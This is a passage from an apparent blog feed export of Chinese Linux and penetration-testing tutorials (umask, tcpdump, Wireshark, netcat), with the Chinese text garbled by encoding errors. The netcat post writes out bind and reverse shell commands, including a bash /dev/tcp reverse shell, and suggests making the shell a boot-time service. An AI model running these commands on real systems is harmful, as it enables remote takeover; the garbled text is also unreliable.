6-2=4ï¼Œæƒé™å°±ä¸º664ï¼‰ - æ–‡ä»¶å¤¹é»˜è®¤æƒé™ï¼š`777`-æ©ç ï¼ˆå¦‚æœæ©ç ä¸º002, 7-2=5ï¼Œæƒé™å°±ä¸º775ï¼‰ å‘½ä»¤ï¼šumaskæŸ¥çœ‹å½“å‰æ©ç ä¿®æ”¹æ©ç å‘½ä»¤ï¼šumask 007ï¼ˆä¸´æ—¶æ€§çš„ï¼‰é•¿ä¹…ä¿®æ”¹ï¼šé…ç½®æ–‡ä»¶vi /etc/login.defs # é…ç½®å…¶ä¸­umask UMASK 022 # å±ä¸»çš„æ©ç 0ï¼Œæ•°ç»„çš„æ©ç 2ï¼Œå…¶ä»–ç”¨æˆ·çš„æ©ç 2 USERGROUPS_ENAB yes # æ”¹ä¸ºyesï¼Œå±ä¸»çš„æ©ç æ¥è¦†ç›–æ•°ç»„çš„æ©ç  # è¦æƒ³ä½¿å¾—çœŸæ­£çš„æƒé™ä¸umaskè®¾ç½®çš„ä¸€è‡´ï¼š F1.å¯ä»¥æŠŠä¸Šé¢çš„æ”¹ä¸ºno F2.è®¾ç½®ç”¨æˆ·è´¦å·åç§°å’Œç»„è´¦å·åç§°ä¸ä¸€æ ·ï¼Œè®©ç”¨æˆ·idå’Œç»„idä¹Ÿä¸ä¸€æ ·ï¼ˆæ¨èè¿™ç§æ–¹å¼ä¿®æ”¹ï¼‰ sudo usermod -g users user01 # æŠŠç”¨æˆ·çš„ä¸»ç»„æ”¹ä¸ºusers umask 002 ç”¨æˆ·åä¸ç»„åç›¸åŒã€UIDä¸GIDç›¸åŒ umask 027 é€šå¸¸è®¾ç½®027å°±è¡Œ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>è´¦å·ç®¡ç†</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å·¥å…· - tcpdumpä½¿ç”¨&è¿‡ç¨‹æ–‡æ¡£è®°å½•]]></title>
    <url>%2Fposts%2F13625%2F</url>
    <content type="text"><![CDATA[å·¥å…·-tcpdumpä½¿ç”¨ No_GUIçš„æŠ“åŒ…åˆ†æå·¥å…· Linuxã€Unixç³»ç»Ÿé»˜è®¤å®‰è£… æŠ“åŒ…é»˜è®¤åªæŠ“68ä¸ªå­—èŠ‚ #å‚æ•°: -iç½‘å¡ -s æŠ“åŒ…å¤§å° -wä¿å­˜åˆ°æ–‡ä»¶ tcpdump -i ens33 -s 0 -w file.pcap #æŠ“å–æŒ‡å®šç«¯å£çš„æµé‡ tcpdump -i ens33 port 22 è¯»å–æŠ“åŒ…æ–‡ä»¶#æŸ¥çœ‹ä¿å­˜åˆ°æ–‡ä»¶ä¸­çš„æ•°æ®åŒ… tcpdump -r file.pcap #å‚æ•°ï¼š -A ä»¥asciiç å½¢å¼æ˜¾ç¤ºå†…å®¹ tcpdump -A -r file.pcap #å‚æ•°ï¼š -X ä»¥16è¿›åˆ¶å½¢å¼æ˜¾ç¤ºå†…å®¹ tcpdump -X -r file.pcap æ˜¾ç¤ºç­›é€‰å™¨#åˆ©ç”¨OSè‡ªå¸¦çš„ç®¡é“ #å‚æ•°ï¼š -n ä»¥ipåœ°å€æ˜¾ç¤ºï¼Œä¸æ˜¾ç¤ºåŸŸåï¼› æ˜¾ç¤ºç¬¬ä¸‰åˆ—(ip+ç«¯å£)å¹¶å»é‡ tcpdump -n -r file.pcap | awk '{print $3}' | sort -u #tcpdumpè‡ªèº«çš„æ˜¾ç¤ºç­›é€‰ï¼š åªæ˜¾ç¤ºæºåœ°å€ä¸ºè¿™ä¸ªçš„ tcpdump -n -src host 192.168.0.1 -r file.pcap #åªæ˜¾ç¤ºç›®çš„åœ°å€ä¸ºè¿™ä¸ªçš„ tcpdump -n -dst host 192.168.0.130 -r file.pcap #æŒ‰ç«¯å£å·ç­›é€‰ tcpdump -n port 53 -r file.pcap #æ˜¾ç¤ºudpçš„53ç«¯å£ tcpdump -n udp port 53 -r file.pcap #æ˜¾ç¤ºtcpçš„ tcpdump -n tcp port 80 -r file.pcap #æ˜¾ç¤ºicmpçš„ tcpdump -n icmp -r file.pcap #æ˜¾ç¤ºipçš„ tcpdump -n ip -r file.pcap #-Xä»¥16è¿›åˆ¶æ˜¾ç¤º tcpdump -nX port 80 -r file.pcap é«˜çº§ç­›é€‰TCPçš„åŒ…å¤´ï¼šå¯ä»¥çœ‹åˆ°ä¸Šå›¾ä¸­Flagä¸­çš„æ ‡å¿—ä½tcpdumpå¯ä»¥å¯¹å¦‚æ­¤ç»†è‡´çš„ä¸œè¥¿è¿›è¡Œç­›é€‰ #åªæ˜¾ç¤ºç¬¬13å·å­—èŠ‚ä¸­å€¼è½¬æ¢ä¸º10è¿›åˆ¶ä¸º24(push+ack)çš„æ•°æ®åŒ… tcpdump -A -n 'tcp[13]24' -r file.cap PS: ncã€Wiresharkã€tcpdumpå¿…é¡»éå¸¸ç†Ÿç»ƒåœ°æŒæ¡ è¿‡ç¨‹æ–‡æ¡£è®°å½•å·¥å…· ä»‹ç»å‡ ä¸ªkaliä¸­è‡ªå¸¦çš„ 1.DradisåŸºäºwebçš„å·¥å…· çŸ­æœŸä¸´æ—¶å°å›¢é˜Ÿèµ„æºå…±äº« å„ç§æ’ä»¶å¯¼å…¥æ–‡ä»¶ï¼ˆå…¼å®¹å¾ˆå¤šç§æ‰«æå™¨æ—¥å¿—çš„å¯¼å…¥ï¼‰ ä½¿ç”¨ï¼šwebappåˆå§‹åŒ–åï¼Œè¾“å…¥å¯†ç å³å¯ç™»å½•å¯¼å…¥å¯¼å‡º(æ”¯æŒä¸åŒæ–‡ä»¶æ ¼å¼)æ‰«æå™¨æ—¥å¿—ï¼ˆå…·ä½“è‡ªå·±æ“ä½œä¸€ä¸‹å°±çŸ¥é“äº†ï¼‰ 2.Keepnoteå±‚çº§åŒ–è®°å½•ä¿¡æ¯ï¼šä¸åŒé¡¹ç›®å¯ä»¥ä½¿ç”¨ä¸åŒæ–‡ä»¶å¤¹ï¼Œå­æ–‡ä»¶å¯ä»¥å¯¼å‡º 3.Truecryptä¸€æ¬¾åŠ å¯†å·¥å…·2014å¹´åœæ­¢æ›´æ–°ï¼ˆå®˜æ–¹åŸå› æ˜¯å®‰å…¨æ€§ä¸å¤Ÿï¼Œä½†å®é™…ä½¿ç”¨å´ä¾ç„¶è¾ƒå®‰å…¨ï¼‰ é€‰æ‹©åŠ å¯†åŒºåŸŸï¼š1.åˆ›å»ºåŠ å¯†æ–‡ä»¶ï¼ˆcreate volumeï¼‰2.åˆ›å»ºå·(å…¨ç›˜åŠ å¯†) é€‰æ‹©åŠ å¯†æ–¹å¼1.æ ‡å‡†åŠ å¯†å·ï¼š2.éšè—åŠ å¯†å·ï¼š è‹¥è¢«äººå¼ºè¿«è¾“å…¥åŠ å¯†å¯†ç ï¼Œå¯ä»¥è¾“å…¥ä¸€ä¸ªå¯†ç æ‰“å¼€åä»€ä¹ˆéƒ½æ²¡æœ‰(outer volume), è€Œé‡è¦ä¿¡æ¯å­˜åœ¨ä¸€å—éšè—ç©ºé—´(hidden volume)é‡Œé¢ã€‚hidden volumeå¤§å°ä¸èƒ½è¶…è¿‡outer volumeã€‚ã€é¦–å…ˆæŒ‡å®šå¤–éƒ¨å·(è¿·æƒ‘åˆ«äººçš„)çš„å¤§å°(å°½é‡å¤§ä¸€äº›,åŒ…æ‹¬å†…éƒ¨å·çš„å¤§å°)å’Œå¯†ç , å†…éƒ¨æœºå¯†å·å­˜åœ¨äºå¤–éƒ¨å·çš„ç©ºé—´ä¸­(è®¾ç½®å®ƒçš„å¤§å°å’Œå¯†ç )ã€‘ é€‰æ‹©åŠ å¯†ç®—æ³•ï¼ˆä¹Ÿå¯ä»¥å¤šç§åŠ å¯†ç®—æ³•å åŠ ç”¨ï¼‰è®¾ç½®å¯†ç æŒ‡å®šå·æ ¼å¼ç”Ÿæˆéšæœºkey(ç”¨é¼ æ ‡å†å±å¹•ä¸Šä¹±æ»‘,åˆ’å¾—æœˆä¹±ï¼Œkeyè¶Šå¤æ‚) ä½¿ç”¨ï¼šé€‰æ‹©æŒ‚è½½çš„æ–‡ä»¶ï¼Œå°±åƒæŒ‚è½½ä¸€å—ç¡¬ç›˜åˆ†åŒºä¸€æ ·ä½¿ç”¨å®Œæˆåï¼šdismountæˆ–dismount allå°±è¡Œ å¯¹äºéšè—åŠ å¯†å·: è¾“å…¥å¤–éƒ¨å·çš„å¯†ç å°±æ˜¯å¤–éƒ¨å·çš„å†…å®¹(å­˜å‚¨å¤§å°ä¹Ÿéšè—äº†å¦ä¸€éƒ¨åˆ†)ï¼Œè¾“å…¥å†…éƒ¨å·çš„å¯†ç æ‰“å¼€çš„å°±æ˜¯å†…éƒ¨å·çš„å†…å®¹ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>tcpdump</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å·¥å…· - Wiresharkä½¿ç”¨]]></title>
    <url>%2Fposts%2F56492%2F</url>
    <content type="text"><![CDATA[Wiresharkç®€ä»‹ æŠ“åŒ…å—…æ¢åè®®åˆ†æ å®‰å…¨ä¸“å®¶å¿…å¤‡æŠ€èƒ½ æŠ“åŒ…å¼•æ“(wiresharkæœ¬èº«æ˜¯åˆ†ææ•°æ®åŒ…, æŠ“åŒ…é ä¸‹é¢ä¸¤ä¸ªå¼•æ“) Linuxä¸Šï¼š Libpcap Windowsä¸Šï¼š Winpcap è§£ç èƒ½åŠ›ï¼ˆè¡¡é‡æŠ“åŒ…è½¯ä»¶å¥½åçš„é‡è¦æ ‡å‡†ï¼‰ åŸºæœ¬ä½¿ç”¨æ–¹æ³•å¯åŠ¨æ•è·-&gt;é€‰é¡¹-&gt; â€¦ â€¦é€‰æ‹©æŠ“åŒ…ç½‘å¡ æ··æ‚æ¨¡å¼å‹¾é€‰ä¸Šä¹‹åï¼Œå¦‚æœæ•°æ®åŒ…ä¸æ˜¯å‘é€ç»™æˆ‘æŒ‡å®šè¿™ä¸ªç½‘å¡çš„ï¼Œä¹Ÿä¼šè¢«æŠ“å– æŠ“åŒ…ç­›é€‰å™¨æŒ‡å®šæŠ“ä»€ä¹ˆåŒ…ï¼Œä¸æŠ“ä»€ä¹ˆåŒ… å®æ—¶æŠ“åŒ…å°±æ˜¯ä¸»ç•Œé¢ ä¿å­˜å’Œåˆ†ææ•è·æ–‡ä»¶å…ˆåœæ­¢ï¼Œå†ä¿å­˜(å¯ä»¥é€‰æ‹©æ ¼å¼, å°½é‡ä½¿ç”¨.pcapæ ¼å¼)ï¼Œå‹ç¼©ç­‰, ä¸‹æ¬¡å¯ä»¥å¯¼å…¥å·²ç»æŠ“å–çš„æ•°æ®åŒ…æ–‡ä»¶ é¦–é€‰é¡¹ç¼–è¾‘-&gt;é¦–é€‰é¡¹ -&gt; å¯ä»¥è‡ªå·±æ ¹æ®éœ€è¦ä¿®æ”¹å’Œå®šåˆ¶ç•Œé¢å¸ƒå±€ ç­›é€‰å™¨ è¿‡æ»¤å¹²æ‰°çš„æ•°æ®åŒ… æŠ“åŒ…ç­›é€‰å™¨(æ•è·, é€‰é¡¹é‡Œé¢é‚£ä¸ª) æ˜¾ç¤ºç­›é€‰å™¨(ä¸»ç•Œé¢é‚£ä¸ª, æ›´å¤šä½¿ç”¨) â€“ å¸¸ç”¨è¯­æ³• å¯ä»¥å•ç‹¬é€‰æ‹©ï¼Œä¹Ÿå¯ä»¥å åŠ (and, or)ä¸Šé¢çš„æ¡ä»¶è¿›è¡Œç­›é€‰ï¼š å¸¸è§åè®®æ•°æ®åŒ…æ•°æ®åŒ…çš„åˆ†å±‚ç»“æ„æ˜¾ç¤º ARP IPProtocolå­—æ®µï¼š è¡¨ç¤ºä¸Šå±‚æ˜¯ï¼š udpâ€“&gt; 17ï¼Œ tcpâ€“&gt; 6, icmp â€“&gt;2, igmp â€“&gt;2å››å±‚æœ‰å¥½å¤šä¸­åè®®å¯¹åº”ä¸åŒçš„æ•°å­—Header checksumå­—æ®µï¼šæ ¡éªŒå’Œ, æ¯ä¸¤ä½è¿›è¡Œå¼‚æˆ–tcpå’Œudpä¸€èˆ¬ä¸ä¼šæœ‰optionå­—æ®µï¼ˆè§†æƒ…å†µè€Œå®šï¼‰ TCP é™„ï¼šä¸‰æ¬¡æ¡æ‰‹ å››æ¬¡æŒ¥æ‰‹ UDP udpå’Œtcpçš„ç±»ä¼¼ï¼Œè‡ªå·±å®è·µèƒ½çœ‹æ‡‚udpå¼€é”€æ›´å° DNS åº”ç”¨å±‚åè®®ï¼ŒåŸºäºudp HTTP ftp è¿™é‡Œæ²¡ftpæœåŠ¡å™¨å°±å…ˆä¸æ”¾å›¾äº†ftpä¹Ÿæ˜¯ä¸€ä¸ªåº”ç”¨å±‚åè®® wisharké»˜è®¤æ˜¯ç”¨ç«¯å£åŒºåˆ†åè®®(å‡è®¾æˆ‘ä»¬æ‰‹åŠ¨æŠŠhttpä¸å¼€åœ¨80ç«¯å£ï¼Œwiresharkåˆ†ä¸æ¸…éæ ‡å‡†ç«¯å£çš„, éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ä¿®æ”¹.å¦‚ä¸‹å›¾.) æ•°æ®æµæ¯”å¦‚è®¿é—®ä¸€ä¸ªç½‘é¡µ, å¾€å¾€äº§ç”Ÿå¾ˆå¤šæ•°æ®åŒ…wiresharkæä¾›äº†æ•°æ®æµ http smtp pop3 ssl ç­‰ æ“ä½œ(ä»¥httpä¸ºä¾‹)ï¼šæŒ‰ç…§ä¸Šå›¾æ“ä½œå®Œåï¼Œä¼šæ¥åˆ°æ•°æ®æµçš„ç•Œé¢ï¼Œå¦‚ä¸‹ï¼š ä¿¡æ¯ç»Ÿè®¡1.æŸ¥çœ‹å¯¼å…¥æ•°æ®åŒ…æ–‡ä»¶æ‘˜è¦ä¿¡æ¯å¯¼å…¥æ•°æ®åŒ…æ–‡ä»¶ï¼Œæ‰“å¼€â€œç»Ÿè®¡â€-&gt;â€œæ–‡ä»¶å±æ€§â€ï¼šå¯ä»¥çœ‹åˆ°ä¸€äº›æ‘˜è¦æ€§çš„ä¿¡æ¯ 2.èŠ‚ç‚¹æ•°æ‰“å¼€â€œç»Ÿè®¡â€-&gt;â€œendpointâ€ï¼š å¯ä»¥ä»¥ipåœ°å€åŒºåˆ†/udpæœ‰å¤šå°‘/äºŒå±‚çš„åŒ…å¤´/å…¶ä»–æ ‡å‡†åŒºåˆ† èŠ‚ç‚¹çš„ä¸ªæ•°ç­‰Txè¡¨ç¤ºå‘é€, Rxè¡¨ç¤ºæ¥æ”¶çš„æ•°æ®åŒ… 3.åè®®åˆ†å¸ƒæ‰“å¼€â€œç»Ÿè®¡â€-&gt;â€œåè®®åˆ†çº§â€ï¼šå¯ä»¥çœ‹åˆ°æ¯ä¸ªåè®®é‡Œé¢ä»€ä¹ˆåè®®çš„å ç”¨ç™¾åˆ†æ¯”(DNSæµé‡å ç”¨ä¸€èˆ¬éƒ½å¾ˆå°,å¦åˆ™å¾ˆæœ‰å¯èƒ½å‡ºç°å¼‚å¸¸) 4.åŒ…å¤§å°åˆ†å¸ƒæ‰“å¼€â€œç»Ÿè®¡â€-&gt;â€œåˆ†ç»„é•¿åº¦â€ï¼šå¯ä»¥çœ‹åˆ°å¤§åŒ…å¤šè¿˜æ˜¯å°åŒ…å¤š 5.ä¼šè¯è¿æ¥æ‰“å¼€â€œç»Ÿè®¡â€-&gt;â€œconversationsâ€ï¼šå¯ä»¥çœ‹åˆ°å“ªä¸¤å°æœºå™¨ä¹‹é—´æ•°æ®åŒ…ä¼šè¯ä¼ é€æœ€å¤šå•¥çš„ 6.è§£ç æ–¹å¼å¯¹äºéé»˜è®¤ç«¯å£çš„æ•°æ®åŒ…ï¼Œwiresharlåªä¼šæŒ‰ç«¯å£åŒºåˆ†çš„å³é”®, æ‰‹åŠ¨decodeä¸ºæŒ‡å®šçš„åè®®ï¼Œ è¿™æ ·wiresharkå°±ä¼šæŒ‰æ­£ç¡®çš„åè®®æ¥è§£æ éœ€è¦ç†Ÿæ‚‰ä¸åŒåè®®æ•°æ®åŒ…çš„å†…å®¹, é˜²æ­¢æ‰‹åŠ¨è§£æé”™è¯¯ 7.ä¸“å®¶ç³»ç»Ÿâ€œåˆ†æâ€ -&gt; â€œä¸“å®¶ç³»ç»Ÿâ€: å¯èƒ½è‡ªåŠ¨ç»™æˆ‘ä»¬ä¸€äº›æç¤º æ€è·¯ï¼šå¦‚æœå¾ˆå¤šä¸ªæ•°æ®åŒ…ï¼Œå…ˆä»ç»Ÿè®¡ä¿¡æ¯å…¥æ‰‹ï¼Œåˆ†æå‡ºé‡ç‚¹ï¼Œæ‰¾å‡ºæ–¹å‘ã€‚ç„¶åç­›é€‰å‡ºæ¥ï¼Œé€æ­¥åˆ†æåŒ…çš„å†…å®¹ å®è·µ æŠ“åŒ…å¯¹æ¯”ncã€nctaåŠ å¯†ä¸ä¸åŠ å¯†çš„æµé‡ ä¼ä¸šæŠ“åŒ…éƒ¨ç½²æ–¹æ¡ˆ (Wiersharkä¹Ÿæœ‰ä¸è¶³ï¼Œå¤§å‹ç½‘ç»œè¿˜æ˜¯éœ€è¦å•†ä¸šåŒ–çš„è½¯ä»¶) Sniffer Cace / riverbed ï¼ˆå¤§éƒ¨åˆ†è¿˜æ˜¯åŸºäºwiresharkè¿›è¡Œäº†äºŒæ¬¡å¼€å‘ï¼Œæ”¹åäº†åº”è¯¥, å¦‚æœéœ€è¦å»ç½‘ä¸Šæ‰¾å§ï¼‰ Cascad pilot document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å·¥å…· - netcatä½¿ç”¨]]></title>
    <url>%2Fposts%2F13625%2F</url>
    <content type="text"><![CDATA[netcatä½¿ç”¨ç®€ä»‹ ä¾¦å¬æ¨¡å¼/ä¼ è¾“æ¨¡å¼ å¯ä»¥æ›¿ä»£telent / è·å–bannerä¿¡æ¯ ä¼ è¾“æ–‡æœ¬ä¿¡æ¯ ä¼ è¾“æ–‡ä»¶/ç›®å½• åŠ å¯†ä¼ è¾“æ–‡ä»¶ è¿œç¨‹æ§åˆ¶/æœ¨é©¬ åŠ å¯†æ‰€æœ‰æµé‡ æµåª’ä½“æœåŠ¡å™¨ è¿œç¨‹å…‹éš†ç¡¬ç›˜ åŸºæœ¬ç”¨æ³•1. å®ç°telnet / banner# é¢˜å¤–è¯:è¿½è¸ªè·¯ç”± mtr 114.114.114.114 ## ncä½œä¸ºå®¢æˆ·ç«¯ï¼š # å‚æ•° -v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ # å‚æ•° -n å¦‚æœæ˜¯åŸŸå,ä¸è¿›è¡ŒåŸŸåè§£æ(å»ºè®®ç›´æ¥è·Ÿipåœ°å€) nc -nv 1.1.1.1 110 # è¿æ¥pop3æœåŠ¡å™¨ï¼Œå¯ä»¥çœ‹åˆ°bannerä¿¡æ¯ï¼ˆå¯ä»¥è¿›è¡Œuserç™»å½•[base64ç¼–ç ],è¾“å…¥æŒ‡ä»¤ï¼‰ nc -nv 1.1.1.1 25 # smtpæœåŠ¡å™¨ nc -nv 1.1.1.1 80 # æ¢æµ‹80ç«¯å£(éƒ½å¯è¿›è¡Œäº¤äº’çš„å‘½ä»¤) 2.ä¼ è¾“æ–‡æœ¬ä¿¡æ¯# å¯ä»¥åšèŠå¤©ç”¨ # ä¸€å°ä½œä¸ºæœåŠ¡ç«¯ -l ç›‘å¬, -p ç«¯å£ nc -l -p 4444 # å¦ä¸€å°ä½œä¸ºå®¢æˆ·ç«¯å»è¿æ¥æœåŠ¡ç«¯ nc -nv 1.1.1.1 4444 ç”¨é€”ï¼šè¿œç¨‹ç”µå­å–è¯ (åŸåˆ™:å°½å¯èƒ½å°‘ä¿®æ”¹è¢«å®¡è®¡ç³»ç»Ÿçš„çŠ¶æ€ï¼Œé¿å…å½±å“è¯æ®)å°±å¯ä»¥ç”¨ncæ¥æ“ä½œ:æˆ‘çš„ç”µè„‘: nc -l -p 3333 ç›‘å¬è¢«å®¡è®¡ç³»ç»Ÿ:ls -l | nc -nv 1.1.1.1 3333 è¾“å‡ºåˆ°æˆ‘çš„ç”µè„‘ æˆ‘çš„ç”µè„‘: nc -l -p 3333 &gt; ps.txt è¾“å‡ºç»“æœé‡å®šå‘åˆ°æ–‡ä»¶è¢«å®¡è®¡ç³»ç»Ÿ:ps -ef | nc -nv 1.1.1.1 3333 -q 1 å‚æ•°-q: è¾“å‡ºå®Œæˆä¹‹åè¿‡1ç§’å°±æ–­å¼€ é¢˜å¤–è¯ï¼šlsof æŸ¥çœ‹å·²ç»æ‰“å¼€çš„æ–‡ä»¶ 3.ä¼ è¾“æ–‡ä»¶/ç›®å½•ä¼ è¾“æ–‡ä»¶# å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯ä¼ è¾“ ï¼ˆæ­£å‘ï¼‰ Aï¼š nc-lp 3333 > 1.mp4 B: nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1 # æˆ–è€…, æœåŠ¡ç«¯å‘å®¢æˆ·ç«¯ä¼ è¾“æ–‡ä»¶ ï¼ˆåå‘ï¼‰ A: nc -q 1 -lp 3333 &lt; a.mp4 B: nc -nv 1.1.1.1 3333 > 2.mp4 ä¼ è¾“ç›®å½•# æ­£å‘(æœåŠ¡ç«¯å…ˆæ‰“åŒ…å†ä¼ ç»™å®¢æˆ·ç«¯,æ³¨æ„å°æ¨ªçº¿åˆ«é—æ¼) A: tar -cvf - music/ | nc -lp 3333 -q 1 B: nc -nv 1.1.1.1 3333 | tar -xvf - # å…ˆæ¥æ”¶å†è§£åŒ… åŠ å¯†ä¼ æ–‡ä»¶Aï¼š nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb > 1.mp4 # æ¥æ”¶ï¼Œè§£å¯† Bï¼š mcrypt --fulsh -Fbq -a rijndael-256-m ecb &lt; a.mp4 | nc 1.1.1.1 3333 -q 1 # åŠ å¯†ï¼Œä¼ é€ # éœ€è¦è¾“å…¥åŠ å¯†ç§˜é’¥ï¼Œè§£å¯†ç§˜é’¥ # ä¸æ˜¯ncçš„åŠ å¯†åŠŸèƒ½ï¼Œæ˜¯æ“ä½œç³»ç»Ÿçš„åŠ å¯†å‘½ä»¤ï¼Œå¯ä»¥è‡ªè¡Œå®‰è£… 4.æµåª’ä½“#æŠŠè§†é¢‘æµè¾“å‡ºåˆ°Bç«¯ A: cat 1.mp4 | nc -lp 3333 B: nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 - #æ¥æ”¶è§†é¢‘æµï¼Œè¾“å‡ºç»™æŒ‡å®šæ’­æ”¾å™¨å’Œç¼“å­˜è¿›è¡Œæ’­æ”¾ 5.ç«¯å£æ‰«æ ä»¥å®¢æˆ·ç«¯è§’è‰²`bash #å¹¶éæ“…é•¿ç«¯å£æ‰«æ #å‚æ•° -z æ‰«æå‚æ•°ï¼Œåªåˆ¤æ–­æ˜¯å¦å¼€æ”¾ï¼ˆé»˜è®¤tcpï¼‰nc -nvz 1.1.1.1 1-65535 #å‚æ•° -u æ‰«æudpæœåŠ¡çš„ç«¯å£ ï¼ˆä¸å¤ªå‡†ç¡®ï¼‰nc -nvzu 1.1.1.1 1-1024 #### &lt;font color=red&gt;6.è¿œç¨‹å…‹éš†ç¡¬ç›˜&lt;/font&gt; **è¿œç¨‹ç”µå­å–è¯**ï¼Œå¯ä»¥å°†ç›®æ ‡æœåŠ¡å™¨ç¡¬ç›˜è¿œç¨‹å¤åˆ¶(`å—`çº§åˆ«çš„å¤‡ä»½,`ç£ç›˜ç£é“çš„çŠ¶æ€åŸåŸæœ¬æœ¬çš„å¤åˆ¶`)ï¼Œæˆ–è€…å†…å­˜(å†…å­˜ä¸­è¿è¡Œçš„ç—…æ¯’è¿›ç¨‹) ```bash A: nc -lp 3333 | dd of=/dev/sda B: dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1 7.è¿œç¨‹æ§åˆ¶å‚æ•°: -cæ­£å‘ï¼š ç›®æ ‡æœºå™¨ä½œä¸ºæœåŠ¡ç«¯ç›‘å¬, æŠŠbashä¼ ç»™æˆ‘ A: nc -lp 3333 -c bash #ç›®æ ‡æœºå™¨ B: nc 1.1.1.1 3333 åå‘ï¼š æˆ‘çš„æœºå™¨ä½œä¸ºæœåŠ¡ç«¯, è®©ç›®æ ‡æœºå™¨ä½œä¸ºå®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥æˆ‘(å®¢æˆ·ç«¯æŠŠbashä¼ ç»™æœåŠ¡å™¨ç«¯) A: nc -lvp 3333 B: nc 1.1.1.1 3333 -c bash #ç›®æ ‡æœºå™¨ #å‡å¦‚ncä¸æ”¯æŒ-c æˆ–è€… -e å‚æ•°ï¼ˆopenbsd netcatï¼‰,æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿåˆ›å»ºè¿œç¨‹shell ç›®æ ‡æœºå™¨ï¼š bash -i >&amp; /dev/tcp/192.168.41.133/2223 0>&amp;1 æ”»å‡»æ–¹ï¼š nc -lvvp 2223 Note: Windowsç”¨æˆ·æŠŠbashæ”¹ä¸ºcmd åå‘è¿æ¥ç”¨çš„å¤šï¼Œ å› ä¸ºå¥½å¤šéƒ½é™åˆ¶è¿›å…¥çš„æµé‡è€Œä¸å¤ªå¤šé™åˆ¶å‡ºå»çš„æµé‡(æ ¹æ®ä»–å…è®¸çš„ç«¯å£è°ƒæ•´,æ¯”å¦‚dns) é•¿ä¹…ç»´æŒä¼šè¯ï¼š å†™æˆè„šæœ¬ä½œä¸ºç³»ç»ŸæœåŠ¡ï¼Œè®©ç›®æ ‡æœºå™¨å·²å¯åŠ¨å°±è¿æ¥æˆ‘ ncat å‘½ä»¤ ncç¼ºé™·ï¼š ncç¼ºä¹åŠ å¯†èƒ½åŠ›ï¼šæ˜¯æ•°æ®æ˜¯æ˜æ–‡ä¼ è¾“ï¼ˆå®¹æ˜“è¢«åˆ«äººå—…æ¢ï¼‰ ç¼ºä¹èº«ä»½éªŒè¯èƒ½åŠ›ï¼šç«¯å£å¦‚æœä¸€ç›´å‘å¤–å¼€æ”¾ï¼Œå®¹æ˜“è¢«ä»–äººè¿æ¥çªƒå–å½“åšè‚‰é¸¡ ä¸åŒç³»ç»Ÿ/å¹³å°çš„ncå‚æ•°åŠŸèƒ½ä¸å°½ç›¸åŒï¼ˆè‡ªå·± -h æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£å’Œæµ‹è¯•ï¼‰ ncat å‘½ä»¤æ˜¯åŒ…å«åœ¨nmapå·¥å…·åŒ…ä¸­é‡Œé¢çš„ä¸€ä¸ªä¸œè¥¿(å¼¥è¡¥äº†ncç¼ºä¹åŠ å¯†å’Œèº«ä»½éªŒè¯çš„ä¸è¶³) æ­£å‘è¿æ¥ï¼š #å…ˆè¿›è¡Œäº†ç§˜é’¥äº¤æ¢å’ŒåŠ å¯† #è¢«æ§ç«¯(æœåŠ¡å™¨ç«¯) -allowå…è®¸è¿æ¥çš„ipï¼Œ ç«¯å£, sslåŠ å¯† A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl B: ncat -nv 192.168.1.19 3333 --ssl #æ”»å‡»ç«¯ å…¶ä»–â€¦ â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>nc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-ç½‘ç»œç›¸å…³çŸ¥è¯†]]></title>
    <url>%2Fposts%2F9091%2F</url>
